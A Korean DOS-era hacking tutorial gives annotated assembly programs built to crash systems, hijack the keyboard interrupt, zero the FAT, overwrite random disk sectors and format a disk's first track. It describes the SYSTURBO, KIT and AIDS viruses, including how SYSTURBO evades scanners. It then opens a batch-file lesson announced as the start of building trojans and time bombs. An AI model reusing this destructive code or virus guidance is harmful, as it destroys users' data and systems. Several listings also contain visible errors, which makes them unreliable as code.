 사용 방법 +-- --+ | MOV AH, 펑션코드 | | INT 21H | +- --+ 예) 화면으로 문자열 출력 MOV AH, 9 MOV DX, OFFSET MSG INT 21H MSG DB 'TEST MESSAGE' 시스템 호출의 펑션코드와 기능 +-----------------+--------------------------------+ | Function Code | Function | +-----------------+--------------------------------+ | 1h | 키보드로부터 한 문자 입력 | | 2h | 화면에 한 문자 출력 | | 5h | 프린터로 한 문자 출력 | | 8h | 에코(화면에) 없는 한 문자 출력| | 9h | 화면으로부터 문자열 출력 | | Fh | 화일 open | | 10h | 화일 close | | 25h | 인터럽트 벡터 세트 | | 31h | 프로세스 상주 프로그램 | | 35h | 인터럽트 벡터 취득 | | 4Ch | 프로그램 종료 | +-----------------+--------------------------------+
 *임의의 점프 프로그램 ───────────────────────────────────── 이 프로그램은 랜덤으로 점프하여 컴퓨터가 오동작을 하게 만든다. 대개의 경우 컴퓨터를 더 이상 제어할수 없게 되므로 실행에 주의를 요한다. 1: code segment para 'code' 2: assume cs:code 3: 4: org 100h 5: 6: main proc far 7: start: mov ah,2ch ; 시간 알아내기 8: int 21h 9: 10: push cx ; CS에 pop된다 11: push dx ; IP에 pop된다 12: 13: ret ; 임의의 리턴 14: 15: main endp 16: code ends 17: end start 위 프로그램은 DOS의 호출기능을 이용하여 현재 시간을 알아내어 시간, 분, 초,1/100초에 해당하는 값을 이용하여 실행시 마다 시시각각 변하는 값을 랜덤화에 이용한다. 그러므로 제어는 엉뚱한 곳으로 흐르게 되어 시스템은 비정상적으로 작동하게 된다. 
[ 실험 결과 ] 대부분 화면에 이상한 문자를 쓰고 시스템이 죽어버렸으며 시스템의 시계가 초기화가 된 경우가 있었다. 

♠키보드 인터럽트 벡터 바꾸기 프로그램 

────────────────────────────────────── 

이 프로그램은 키보드 인터럽트의 벡트를 바꾸기 때문에 한번 실행되면 더 이상 키보드를 사용할수 없게 된다. 따라서 다시 컴퓨터를 작동 시키려면 재 부팅시키는 수밖에 없으므로 실행 시키기 전에 저장해야할 데이타가 있는지 꼭 살펴볼것.
 1: code segment para 'code' 2: assume cs:code 3: 4: org 100h 5: 6: mov ah,35h ; 인터럽트 벡터 알아내기 7: mov al,6 ; 미사용 인터럽트(INT 6) 8: int 21h 9: 10: mov ah,25h ; 인터럽트 벡터 설정 11: mov al,9 ; 키보드 인터럽트(INT 9) 12: mov dx,bx ; 인터럽트 처리 루틴의 오프셋 13: push es 14: pop ds ; 인터럽트 처리 루틴의 세그먼트 15: int 21h 16: 17: int 20h ; 프로그램 종료 18: 19: code ends 20: end crash 
< 설명 > 키보드 인터럽트(Keyboard interrupt)는 하드웨어 인터럽트(Hardware interrupt)로서 사용자가 키보드를 누르는 순간 발생한다. 인터럽트 번호는 9로서 메모리의 0000:0024h 번지에서 부터 4바이트에 걸쳐 인터럽트 실행 루틴의 시작번지가 있다. 키보드 인터럽트가 걸리게 되면 메모리의 0000:0024h 번지의 내용으로 점프하게 된다. 따라서 이 내용을 바꾸게 되면 키보드 인터럽트를 가로챌 수 있다. 이 프로그램은 도스의 기능 호출 35h로서 인터럽트 벡터를 알아낸다. 
그리고 인터럽트 6번은 사용되지 않는 인터럽트이다 이 프로그램은 인터럽트 9h의 처리 루틴 주소를 인터럽트 6h의 주소로 바꾸어 놓는 일을 한다. 따라서 키가 눌러져서 인터럽트 9h가 발생하면 결국 인터럽트 6h를 실행하게 된다. 그런데 인터럽트 6h는 사용되지 않는 것이기 때문에 아무일도 하지 않게 되므로 더 이상 키보드를 사용할수 없게 된다. < Ctrl + Alt + Del > 도 사용할수 없다. 
< 주의 > 이 프로그램이 실행이 되고 나면 시스템을 다시 부팅 시키는 수밖에 없다. < 참고 > 이 프로그램에다가 하드를 쓸데 없이 많이 읽게 하거나 특정한 트랙이나 랜덤한 트랙을 포맷하게 한다면 무서운 일이 버러질수 있다. 하드의 수명이 줄고 format 명령으로 다시 포맷을 해야하는 경우가 생기니까.... 

♠FAT 파괴 프로그램

────────────────────────────────────── 

이 프로그램은 현재 사용 중인 드라이브의 할당 테이블을 모두 0 으로 만들어 버린다. 실행시 반드시 테스트 디스켓을 사용할것.
 1: code segment para 'code' 2: assume cs:code 3: 4: org 100h 5: 6: start: 7: mov ah,19h ; 현재 사용중인 드라이브 알아내기 8: int 21h 9: 10: mov dl,al ; 드라이브 번호 알아내기 11: 12: mov ah,3 ; 섹터 쓰기 13: mov al,4 ; 기록할 섹터수 14: lea bx,cs:buffer ; 데이타 버퍼의 오프셋 15: mov ch,0 ; 트랙 번호 16: mov cl,2 ; 섹터 번호 17: mov dh,0 ; 헤드 번호 18: push cs 19: pop es ; 데이타 버퍼의 세그먼트 20: int 13h 21: 22: int 20h 23: 24: buffer db 512 * 4 dup(?) ; 데이타 버퍼 25: 26: code ends 27: end start 위 프로그램은 화일 할당 테이블을 바꾸는 프로그램으로, 그 내용은 모두 0 으로 만들어 버린다. 7,8행에서 현재 사용 중인 드라이브를 알아내고, 그 결과 사용중인 드라이브 번호는 AL에 들어가 있게 된다. 10~20행에서는 BIOS 인터럽트 13h를 이용하여 디스크에 기록하는 일을 한다.
 [ 실험 결과 ] 화일 할당 테이블이 모두 0 으로 변하였고, 화일을 실행시키려 하면 에러가 발생한다. 

♠임의의 디스크 섹터 파괴

────────────────────────────────────── 

이 프로그램은 현재 사용 중인 드라이브의 디스켓을 파괴한다. 1: code segment para 'code' 2: assume cs:code 3: 4: org 100h 5: 6: start: mov ah,2ch ; 현재 시간 구하기 7: int 21h 8: 9: mov ds,cx ; 전송 버퍼의 세그먼트 10: 11: mov ax,dx ; 디스크의 랜덤 섹터 구하기 12: xor dx,dx 13: mov dx,720 14: div bx 15: 16: mov al,19h ; 현재 사용중인 드라이브 알아내기 17: int 21h 18: 19: xor bx,bx ; 전송할 버퍼의 오프셋 20: mov cx,1 ; 기록할 섹터수 21: int 26h ; 디스크 쓰기 22: 23: int 20h ; 프로그램 종료 24: 25: code ends 26: end start
 < 설명 > 이 프로그램은 시스템으로부터 시간을 읽어서 그 값을 이용하여 섹터를 파괴한다. 6~7 행에서 현재 시간을 구하고, 9~14행에서는 구한 시간을가지고 랜덤 섹터를 구한다. 21행에서는 DOS의 인터럽트를 이용하여 디스크 쓰기를 하였다...
 < 결과 > 이 프로그램을 실행할때 마다 사용중인 디스크의 임의의 섹터를 파괴한다. 

♠디스크의 첫 트랙 포맷

────────────────────────────────────── 

이 프로그램은 현재 사용 중인 드라이브의 첫 트랙을 포멧시킨다. 한번 실행 시키면 그 디스크는 도스의 FORMAT.EXE 나 PCTOOLS.EXE 로 다시 포멧 시켜야지만 사용할 수 있다.
 1: code segment para 'code' 2: assume cs:code 3: 4: org 100h 5: 6: start: 7: mov ah,19h ; 현재 사용중인 드라이브 알아내기 8: int 21h 9: 10: 11: mov dl,al ; 드라이브 번호 12: 13: mov ah,5 ; 트랙 포멧하기 14: mov al,9 ; 섹터의 갯수 15: lea bx,marker ; 어드레스 마커의 오프셋 16: push cs ; 어드레스 마커의 세그멘트 17: pop es 18: mov ch,0 ; 트랙 번호 19: mov cl,1 ; 섹터 번호 20: mov dh,0 ; 헤드 번호 21: int 13h 22: 23: int 20h 24: 25: marker db 0 ; 트랙 번호 26: db 0 ; 헤드 번호 27: db 1 ; 섹터 번호 28: db 2 ; 섹터당 바이트(512) 29: 30: code ends 31: end start
 < 설명 > 바이러스가 수행할 수 있는 작업 중에 가장 치명적이고 심각함 문제가 되는 것이 디스크를 포멧시키는 것이다. 위 프로그램을 보면 알수 있듯이 디스크를 포멧하는 것은 아주 간단하고 쉽다. 7~8 행에서 현재 사용중인 드라이브를 알아내고, 트랙,섹터,헤더에 값을 주어 디스크의 첫 트랙을 포멧시도록 되어 있다. 
< 결과 > 이 프로그램이 실행되고나면 현재 사용중인 드라이브의 디스크를 파괴시킨다. 

------------------------------------------------------------------------ 

(3) 어셈블리 바이러스 실제 구현 

실제로 어셈블리로 제작된 바이러스의 소스를 공개하겠다.어셈블리로 제작된 바이러스의 구조와 원리등을 파악하여 대처하기 바란다. 

A. 시스터보 바이러스 

이 바이러스는 예전에 하이텔 OSC동호회에 올려졌던 SYSTURBO 바이러스의 정식 버젼(?)이다. 고정적인 코드는 다른 풀그림에서도 사용되는 mov ax,cs/mov ds,ax, 이런 코드이기에 백신 제조시 자칫 멀쩡한 프로그램을 오판할수 있는 기회를 많이 주었다. 감염외에는 아무일도 하지 않는다.
 다크어벤져식의 램 상주 방법으로는 EMS상태에서 감염된 화일이 처음 실행시 pklite 1.03버젼과 exepack 4.0버젼으로 압축된 화일과 잘 동작이 되지 않았다. 그래서 처음 실행되는 감염된 화일의 실행은 예루살렘의 재로딩 기법을 썼다. 소스는 다소 길어졌지만 기존 다크어벤져나 예루살렘이 EMS에서 잘 작동되지 않던 것은 것을 고쳤다고 할 수 있다. 상주 여부는 벡터테이블중 CP/M처리 루틴이 있는 8바이트 영역에 있다. 이것중 한바이트를 이용, 이 값이 25h이면 상주를 포기한다. 참고로 DIR-II도 이 부분을 쓰는데 이것과 위치를 틀리게해서 충돌을 막았다.
 이 프로그램의 특징은 XOR로 암호화 하는것과 앞과 뒤의 프로그램의 길이가 가변이라는 점이다. 그래서 기존 한국형 백신들이 오프셋의 어떤 바이러스문자열을 찾아 치료하는 그런 간단한 루틴으로는 못치료하게 되었다. 물론 여기에서 소개하는 바이러스는 SYSTURBO 바이러스와 동일 루틴이니 백신 치료는 가능하다. 실행되는 화일중 이름에 V, C, HWP는 피해서 감염한다. 백신과 스캔 그리고 COMMAND.COM, 아래아 한글을 피하기 위한 것이다. 

B. KIT 바이러스 

1991년 10월에 케텔(KETEL)의 공개자료실(GLdown)에서 발견된 파일 바이러스이며, 한국산 파일 바이러스중에서 8번째로 발견된 바이러스이다. 공개 자료실에 7455번으로 등록된 LPARK2.COM이라는 프로그램으로 4yfkg9라는 사용자가 등록했으며, VGA용 파킹(Parking) 프로그램이라는 설명이 붙어있었다. 이 프로그램을 실행시키면 PARK2.COM이라는 13344 byte 길이의 프로그램이 생성되는데 PARK2.COM을 실행시키면 'Turn Off Your System!'(당신의 시스템을 끄시오!)이라는 말과 함께 여자의 상반신 누드사진이 불분명하게 출력된다.
 이 바이러스를 분석해 보면 'Copyright 1991-1999.KIT VIRUS(version 2.0)'이라는 문자열이 존재한다. 감염된 프로그램을 실행시킨지 20분이 경과하면 키보드에서 ,, 을 나타내는 세개의 램프가 번갈아가면서 점등하는 현상이 발생하는 데, 이 모습이 TV 외화 프로그램인 '전격 Z 작전'에 나오는 자동차의 이름인 키트(KIT)의 앞모습과 비슷하여 이름을 붙인 것이다.
 상주형, 기생형 바이러스이다. 감염되면 확장명이 COM 파일인 경우는 2384 byte 늘어나고, EXE 파일은 바이러스가 기억장소에 상주한 시간에 따라서 증가 길이가 달라져서 2384∼2479 byte까지 증가할 수 있다. 감염후 파일을 수행할 경우 20분 간격으로 30초간 키보드 우측상단의 3개의 램프를 깜박거린다 프로그램을 실행시키기 위해서 로드하는 시간이 평소보다 오래 걸린다. 백신Ⅲ와 SCAN은 감염되어도 길이가 증가하지 않는다.
 진단하기 위해서는 VⅢ63 이상을 사용해야 하며, 치료는 VⅢV63 이상의 버전을 사용해야 한다. 소스는 KIT20.ASM 이란것으로 제공하니 참조하기 바란다. 

C. 에이즈(AIDS) 바이러스 

이 바이러스는 하하하(Hahaha), 조롱(Taunt), VGA2CGA 바이러스라고도 알려져 있다. 겹쳐쓰기형 및 비상주형 바이러스이다. COM 프로그램의 처음 13KB 정도를 바이러스 프로그램으로 채우기 때문에 완전히 복구가 불가능하다. 'Your Computer now has AIDS'라는 말을 출력하면서 시스템을 정지시킨다. 

------------------------------------------------------------------------




해킹 강좌 4회

------------------------------------------------------------------------ 

당분간 배치화일 프로그래밍 기법을 이용한 트로이목마 & 시한폭탄 바이러스를 만들어 봅시다. 실제 사용하는 트로이목마 & 시한폭탄 바이러스는 본인이 직접 개발한 것들로 아주 독창적인 것으로 그 누구도 아직 만들지 못한 것들이죠. 많은 도움 되길 바랍니다.

------------------------------------------------------------------------ 

이제부터 "배치화일"을 시작해 봅시다. 

일단 기본적인 문법을 쉽게 배워보고 그다음 유틸리티등 소스를 보며 진행하는 방향입니다. 조금씩 진행하고 점점 강화하겠습니다. 첨부터 질리면 곤란하겠죠? 차근 차근 해보자구요. 배치화일의 시작 정의 :도스의 배치화일은 하나 또는 여러 개의 도스 명령어들로 구성되는 텍스트 화일이다. 배치화일은 확장자가 BAT이다. 라고 정의 됩니다.
 여러분이 기존까지 알고있는 배치화일이란게 고작 AUTOEXEC.BAT나 게임같은거 할때 몇개의 명령어를 합쳐놓은것에 불과하다는 정도로만 알고있을겁니다. 하지만 "배치"로 만들수있는 것들은 무척 다양합니다. 우린 바로 이러한 것을 배우고 "배치"로 바이러스를 배우자는게 목적입니다 거기에 해킹에 대한 약간의 지식도 함께 말이죠. 이제 실전으로 들어가죠. 우선 "배치"화일을 어떻게 만들까요? 대부분의 경우 에디터 로 만듭니다. 하지만 순수한 도스에서 만들수도 있습니다. ------------------------------------------------------------------------

*하나,화면을 지운후 날짜를 표시하는 프로그램 

예) COPY CON ddate.BAT 엔터 CLS DATE ^Z <== CTRL + Z 입니다. 이명령을 반드시 줘야 화일을 생성해 냅니다. 1 FILES COPIED <= 이렇게 되면 된것입니다. 첨보실거에요, COPY CON 이란걸~ COPY 다음에 CON 이 들어가면 이렇게 할수 있답니다. 아셨죠? 반드시 기억하세요!! 이런 잘 쓰지않는것들이 큰 힘이 되니까요. 자 실행해보면, 화면이 지워진후 날짜가 표시되며 입력을 기다릴겁니다. 여기서 프로그램들속에 포함되어있는, 컴파일러(실행형 파일 변환 프로그램)를 작동해 봅시다. BAT2EXE TIME.BAT 이렇게 해보시면 TIME.COM 이 생성되어 있을겁니다. 그럼 TIME.COM을 실행시켜 보세요. 더욱 빠른속도로 소스를 안보이면서 실행이 될겁니다. 여러분, AUTOEXEC.BAT를 보면 PROMPT $P$G 라고 쓰여진 줄이있죠? 이것이 있기때문에 우린 디렉토리를 이동할때마다 해당 디렉토리가 표시되 는 것입니다. PROMPT 다음에 여러가지 설정값을 변경시켜 줄수있습니다. 
설정값 몇개) $b "|"문자 $d 날짜표시 $e ASCII "escape"문자 $g ">"문자 $h ASCII "back space"문자 $i "<"문자>EXE->BAT 순입니다. 반드시 기억!! 이건 아주 중요한 의미를 갖습니다. 우리가 나중에 바이러스를 제작할때 반드시 요긴하게 쓰니까요. 바로 똑같은 화일명으로 숨어서 가로챌수 있단는거죠. 가장 간단한 화일찾기 프로그램을 만들어 봅시다. 배치로짜는 화일찾기 프로그램은 현재 여러가지 방법이 존재하나 가장 간단한 명령을 먼저 소개합니다. 이 방법은 관심만 있었으면 대부분 잘 아실겁니다. 

------------------------------------------------------------------------ 


*둘, 간단한 파일찾기 프로그램 

예) COPY CON FFIND1.BAT <= 에디터로 작성해도 됨, 화일명 변경가능 @ECHO OFF <=화면에 명령어가 보이지않게 함 ATTRIB \*.* /S | FIND "%1" ^Z 한줄이라 간단하죠? 우선 무엇인지 설명을 해보죠. 첫줄에 @ECHO OFF 라고 새로 추가된게 있을겁니다. 이것을 맨 처음에 써주면 배치화일이 실행하면서 내부명령어들을 밖으로 보이지 않게 하는것입니다. 배치화일은 실행하면 속을 다 내보이며 돌잖아요. 반드시 외워서 항상 사용해야 합니다 일단은 이런게 있다는정도만 알아두시고, 자세한건 계속 다룰겁니다. BAT2EXE FFIND1.BAT 하시면 FFIND1.COM 이 생성됩니다. 
이제 여러분은 자신만의 실행화일을 만들수있습니다. 어떤 프로그램이든지 소스에 주석(개인적으로 작성한 설명)을 달아놓습니다.그래야 설명이 붙어있어 만든사람도 나중에 보기도 쉽고 고치기도 쉬우니까요 C 에서는 /* 내용 */ 즉, /* 와 */ 를 씁니다만, 배치에서는 REM 을 씁니다

------------------------------------------------------------------------ 

*셋, 주석문 이용한 프로그램 예) COPY CON REMSAMPLE.BAT @ECHO OFF REM 작성자 : 김태봉 REM 작성일 : 95/02/03 .............. ^Z 이렇게 말입니다. REM 이 일단 선언되면 뒤에 나오는 내용은 컴파일시 제외됩니다. 아무런 문제는 일으키지 않고요. 지금 우리가 하는 것은 바이러스 제작에 반드시 꼭 쓰는것입니다. 확실히 이해하시기 바랍니다. 기초가 튼튼해야 쓰러지지 않는법! 차근 차근 해보자구요. 2회때 배운 ECHO 명령어에 대해 좀더 알아봅시다. ECHO 의 옵션으로는 ON / OFF 두가지가 있습니다. ECHO 는 C언에서의 PRINTF 함수나 베이직의 PRINT 랑 그 성격이 비슷하다고 볼수있습니다. 실제 그 예를 보겠습니다.
 "<=" 표시는 제가 설명하는 부분입니다. 실제 소스에는 없습니다. 예) 간단한 화면표시 프로그램 HELLO.BAT <= COPY CON 이나 에디터에서 이렇게 만드는건 아시죠? @ECHO OFF <= 되도록 이줄은 항상 처음에 위치시키시는거 전에 배웠죠. REM 주석을 달때는 REM 잊지마세요.주석달기의 습관화 좋습니다. ECHO ALT + 255 <= 확장 아스키명령 ECHO. ECHO HELLO! <= 기냥 아무거나 쓴 문자 ECHO. PAUSE <= 키입력 기다리는 명령어 ^Z <= CTRL + Z 1FILE(S) COPIED 이제 실행 시켜보세요. HELLO! 라고 표시될겁니다. 그리고 "PRESS ANY KEY TO CONTINUE..." 라고 표시되면 엔터 한번치세요. 이제 감잡으셨죠? ECHO 다음에 어떤 문자등을 표기하면 튀어나온다는걸~ 그리고 ECHO 다음에 . 을 찍은것은 . 이 있으면 그칸은 공란으로 그냥 넘어갑니다. 이걸 잘 활용하면 화면 위치에 글자를 맞추어 출력할수있겠죠? ECHO. 말구 칸을 띄울수가 있습니다.
 바로 요것인데, ECHO ALT+255 <= ALT키랑 숫자패드의 255를 같이 누르면 한줄을 건너띕니다 문자출력하는것은 앞으로 무진장하게 쓰일것입니다. 자신이 만든 프로그램의 도움말로 쓰일수도 있고 설명으로 쓰이고 그 쓰임 새가 많고 반드시 알아야합니다. 맨끝줄에 보이는 PAUSE 는 임의의 키를 누를때까지 잠시멈출수 있게합니다 이것도 용도가 다양합니다. 팁: 배치로 짠 프로그램이 실행하고 있을때 강제로 멈출때는 CTRL+C 입니다 이것은 꼭 배치만 해당되지 않고 대부분 써먹을수 있습니다. 근데, 문자를 한글로 달고 싶다구요? C 로짠 소스도 자체한글 없는건 외부에서 완성,조합형 한글을 작동시켜야 하죠? 배치도 마찬가지입니다. 자체한글이 없어서 굳이 한글을 쓰실려면 미리 한글구동 프로그램을 띄워놓 으시고 쓰세요. 팁: 소스 처음에 한글구동 프로그램 미리 실행할수있게 지정해 두면 한글이 보이겠죠? 

좀더 응용해볼까요? 

예) 하드 검사해서 에러나면 수정해서 나오는결과를 크기대로 정렬해서 프린터로 찍는 프로그램 TEST1.BAT @ECHO OFF REM 아래거 해석하자면 프린터를 켜라는 얘기입니다. PAUSE TURN ON YOUR PRINTER TO PRINT DISK STATUS CHKDSK /F | SORT > PRN ^Z 위의 것을 실행하면, PAUSE 다음에 쓴글들이 화면에 튀어나올겁니다. 이때 프린터켜시고 아무거나 누르면 바로 다음줄이 실행되죠. CHKDSK 가요~~ 후훗~ 알고보니쉽죠? 근데~ | , > 를 모른다고요? | 은 어떻게 생긴거냐면, 쉬프트 누르고 \ 표시 누르면 나옵니다. 뜻은 엔터 친거나 마찬가지 효과입니다. 즉 | 포함된 줄은 엔터안쳐도 엔터친것처럼 실행이 된다는말씀 그리고 > 은 뒤에 PRN 이나 NUL 혹은 화일 등이 따라올수 있습니다. 그러니까 출력내용을 어느 장치로 출력하라는 명령이죠. PRN 은 프린터고요, NUL 은 아무것도 아님! 즉 표시하지말라는 거죠. 화일명을 주면 그리로 출력해요~ 화일로!! 햐~~ 굉장한 명령이죠? 둘다 응용가능성이 빵빵합니다. 요걸 좀더 응용하자면, DIR | SORT 해보세요. 디렉토리 목록을 정렬해서 출력할겁니다. 근데 마음대로 정렬을 조절하고 싶다구요? 그럼 여기 방법이 있으니 아래를보세요 * SORT 다음에 옵션값입니다. ---------------------- 필드 번호 화일명 0 확장자 10 크기 13 날짜 24 시간 34---------------------- 이렇게 해보세요. DIR | SORT /+34 어떻게변하나요? 시간순서로 주~욱 정렬해서 출력하죠? 다음으로 넘어가서, 2회때 소개된 파일찾기 프로그램있죠? 

그것에 대해 분석하고 넘어갑시다. 

예) 파일찾기 프로그램의 가장 단순한 유형 FFIND2.BAT @ECHO OFF REM 작성자 : 개나소나말이나닭이나 REM 날짜 : 하루이틀사흘나흘 REM 기능 : 현재 디스크의 모든 디렉토리를 조사해 *.BAT를 찾는다. ATTRIB *.* /S | FIND ".BAT" | MORE <= ".BAT"의 내용을 바꿀수있다. ^Z 분석해봅시다. 첫줄지나 둘,세,네째줄은 주석입니다. 그리고 메인을 보면, | 이 얼마나 중요한 역할을 하시는지 아실겁니다. 근데 맨끝에 MORE 는 뭘까요? MORE 가 들어가면 한 화면씩 넘어가게 만듭니다. 화일찾는데 많을경우 빠르게 화면 넘어가면 안되니까 한 화면씩 보면서 넘기라고 집어넣은 명령이죠. 보시면 아시겠지만 FIND 가 문자열을 잡아냅니다. 그걸 MORE 로 보내죠. 그러니까, 배치화일은 순서에 입각해서 작동한다 이말입니다. 
그럼 조건이 안맞으면 되돌리거나 바꿀수없냐구요? 그건 5장에 배우실 "조건 분기"때 다룰겁니다. 그때보면 배치란 정말 강력한거구나 하고 느끼실겁니다. 다음번에 더 강력하고 막강한 파일찾기 배치소스의 다른 유형의 것을 소개해 드리겠습니다. 

------------------------------------------------------------------------

여기 소개된 BAT 화일들은 일일이 입력을 해보십시요. 단문이고 하니 직접 쳐보시는게 아마 좋을듯해서 뺐습니다. 계속되는 연습과 응용이 실력을 만드니까요. 장문같은거나 아주 중요한것들은 올려드릴텐 서운해하지 마세요. BAT 소스로 작성하고 나서 BAT2EXE 화일명.BAT 하시면 컴파일하여 실행형 화일로 생성해냅니다. 어셈블리로 만든 바이러스 소스는 초보자들께서 다루기 좀 어렵겠지만 원하시는 분들이 계시니 바이러스 본격적으로 다룰때 올려드릴께요~ 천천히 자세히 읽어보시면서 따라오시면 어느샌가 자신이 생길겁니다. 과정없는 결과란 없다는 말 아시죠? 연습! 연습! 연습이 가장 중요합니다!! 
자기것으로 만드는데 연습이상 좋은건 없으니까요. 이제 배치 프로그래밍 과정의 절반을 넘어섭니다. 배치 프로그래밍이 끝나면 본격적인 바이러스 제작과정으로 넘어가니 기초를 확실히 닦아 놓길 누차 강조합니다. 지금까지 우리는 배치 프로그래밍의 기초를 배웠습니다. 이제부터 진정한 기능을 맛볼 차례입니다. 배치 파라미터 라는 것을 이용하여 명령들이 성공적으로 실행되었는지를 검 사하기위해 사용하는 도스의 IF 명령어를 배워봅시다. 
그리고 특정 화일들 집합에 대해서 특정 명령어를 실행시켜주는 FOR 명령어 를 배웁니다. FOR 를 이용하여 *,? 등의 와일드 카드를 사용할수 있습니다. 이제부터 배치에 전문적인 기능을 부여할수 있습니다. 파라미터를 사용하려면 도스가 인식할 수 있는 %0 에서 %9 까지의 참조기호 를 배치화일 안에 미리 정의해야 합니다. 도스는 항상 파라미터 %0에 실행 시키는 배치화일의 이름을 할당합니다. 다음에 도스는 명령행에서 함께 지 정하는 각각의 정보들에 파라미터 기호 %1에서 %9까지를 할당합니다. 

예를 들어봅니다. 

예) 파라미터 이용한 간단한 예제 LOVE.BAT @ECHO OFF ECHO I %0 YOU, YOU LOVE ME %0.BAT ^Z LOVE.BAT 를 실행하시면 " I LOVE YOU, YOU LOVE ME LOVE.BAT " 이렇게 표시됩니다. %0 에 LOVE 값이 입력된것이죠. 단, 파라미터 %0은 확장자 BAT는 포함하지 않습니다!! 다음을 한번 봅시다. 예) 간단한 예제 둘. SHOW1.BAT @ECHO OFF ECHO PARAMETER 1 IS %1 ECHO PARAMETER 2 IS %2 ECHO PARAMETER 3 IS %3 ECHO PARAMETER 4 IS %4 ECHO PARAMETER 5 IS %5 ECHO PARAMETER 6 IS %6 ECHO PARAMETER 7 IS %7 ECHO PARAMETER 8 IS %8 ECHO PARAMETER 9 IS %9 ^Z 여기서 이렇게 SHOW1 A B C D E F G H I 실행해보세요. 이런 결과가 나올겁니다. PARAMETER 1 IS A PARAMETER 2 IS B . . . . . . PARAMETER 9 IS I 이해되시죠?
 각 파라미터 값에 특정 값이 대입된다는겁니다. 이걸 어디다 쓰냐구요? 널리 알려진 예인데, 다음예를 봅시다. SAFECOPY AUTOEXEC.BAT AUTOEXEC.SAV IF EXIST %2 PAUSE %2 ALREADY EXISTS COPY %1 %2 IF EXIST AUTOEXEC.SAV PAUSE AUTOEXEC.SAV ALREADY EXISTS COPY AUTOEXEC.BAT AUTOEXEC.SAV 이겁니다. 좀 어렵게 느껴질지 모르겠지만, 파라미터 라는건 바로 이렇게 입력값으로 쓴다는것만 알아두세요. 계속 설명하죠~~ IF 명령어를 사용하여 좀더 응용해 봅시다. 

예)IF 와 배치 파라미터를 이용한 화일정렬 프로그램 SORTNAME.BAT @ECHO OFF ECHO PLEASE WAIT........ DIR | SORT | FIND /V "I" > AA.DAT DIR | FIND /V "A.DAT" | SORT /R | FIND "I" > DD.DAT IF '%1' == 'A' TYPE AA.DAT IF '%1' == 'D' TYPE DD.DAT DEL AA.DAT DEL DD.DAT ^Z 설명합니다. 이 화일은 파이프(|) 와 리디렉션(>) 연산자를 이용했습니다. 많은 것을 정렬하기에 둘째줄에 PLEASE WAIT..... 라고 기다리라는 메세지 를 삽입했습니다.
 이러면 컴퓨터가 기다리라니 기다리겠죠? 첫번째는 오름차순 정렬이고 두번째는 내림차순 정렬하라는 뜻입니다. 이렇듯 화일의 SORTING 은 전강좌에서 얘기하였으니 아실겁니다. > 는 추출된 데이타를 화일로 추출하라는거 아시죠? 이게 배치의 묘미중 하나입니다. 첫번째는 추출된 데이타를 AA.DAT 란 화일로 저장하라는 것입니다. 두번째는 추출된 데이타를 DD.DAT 란 화일로 저장하라는 것입니다. AA.DAT 와 DD.DAT 는 임시화일로서 화면에 일단 보여준다음 DEL 로 지웁니다. 그래서 DEL 명령을 집어넣은것이죠. 
IF 다음에 보시면 == 가 있죠? = 는 등호인데 왜 ==를 쓰냐고요? C에서도 그렇듯이 = 하나가 아니라 == 이렇게 두개를 쓰는약속입니다. 엿장수 마음이라나~~~~~~ 좀더 쉽게 설명해볼까요? 예) IF EXIST 이용한 화일 존재여부 테스트 VIEW1.BAT @ECHO OFF IF EXIST %1 TYPE %1 IF NOT EXIST %1 ECHO NO FILE %1 ^Z 여기서 이렇게 실행해봅시다. VIEW1 \CONFIG.SYS <= 임의로 지정하세요. 실행하면 찾았는지 결과를 알려줄겁니다. VIEW1 다음에 화일명 을 입력하면 그것이 %1 에 대입하는 방식입니다. 좀더 수정을 가해봅시다. @ECHO OFF IF NOT '%1' == '' IF EXIST %1 TYPE %1 IF NOT '%1' == '' OF NOT EXIST %1 ECHO NO FILE %1 IF '%1' == '' ECHO MUST SPECIFY A FILE NAME TO DISPLAY 이렇게 하면 좀더 완벽해집니다. 이걸 응용해봅시다.
 컴퓨터 작업을 하다보면 아차 해서 화일을 덮어쓸때가 있죠? 덮어씌우면 복구도 안되고 정말 황당합니다. 이때 미리 방지할 프로그램을 만들어봅시다. 하지만 IF 기능으로는 *,? 를 완벽히 지원못합니다. 다음에 FOR를 배울때 확실해 질겁니다. 예) 안전한 복사 프로그램 SAFECOPY.BAT REM 사용법 C:\SAFECOPY SOURCE.DAT TARGET.DAT IF NOT '%2' == '' IF EXIST %2 ECHO %2 화일이 존재합니다. IF NOT '%1' == '' IF NOT '%2' == '' IF NOT EXIST %2 COPY %1 %2 IF '%1' == '' ECHO 소스 화일과 목적지 화일을 지정해야 합니다. IF NOT '%1' == '' IF '%2' == '' ECHO 목적지 화일을 지정해야 합니다. 사용법은 SAFECOPY 다음에 소스,타겟 화일을 입력하는것입니다. 아직 기능을 덜 활용해서 좀 구식이지만 원리만 알아두세요. %2 에 지정된 목적 화일이 이미 존재하면 배치화일은 에러메시지를 출력하 고 실행을 끝냅니다.
 이 배치화일은 존재하는 화일위에 덮어쓰지 못하게 합니다. 좀전에 추출데이타값을 화일로 받아내는거 보셨죠? 그걸 다시한번 해봅시다. 간단한 예를들어보죠. TIME 치면 시간이 나올겁니다. TIME > DATA.DAT 해보시면 DATA.DAT 란 화일에 TIME 의 시간값을 입력받습니다. 이걸 좀더 응용하면, TYPE 명령을 삽입하여 출력할수가 있습니다. 그러니까~ > 란게 출력방향을 지정한다는거!! 화일로 출력할수 있다는걸 아 시는게 중요합니다. . 이제 슬슬 배치 프로그래밍의 절정기로 접어듭니다.
 ** GOTO 사용 : 조건분기 작성 GOTO 명령어는 단순히 도스로 하여금 배치화일의 특정한 부분으로 이동하도 록 지시하는 명령이다. GOTO를 사용하려면 배치화일 내의 원하는 특정 위치 에 레이블을 붙여놓아야 한다. 배치화일에 레이블을 붙이는 형식은 다음과 같이 레이블 이름과 콜론을 사 용한다. :LABEL 여기서 : 의 사용이 중요합니다. BASIC 프로그래밍에서는 행(10,20,30...) 을 사용했지만 배치에서는 행이 아니라 단순 나열형으로 가다 : 위치에서 지정된 조건등을 받습니다. 지정된 것이란, 예를들어~ GOTO LABEL 이죠. 구체화를 해보겠습니다.
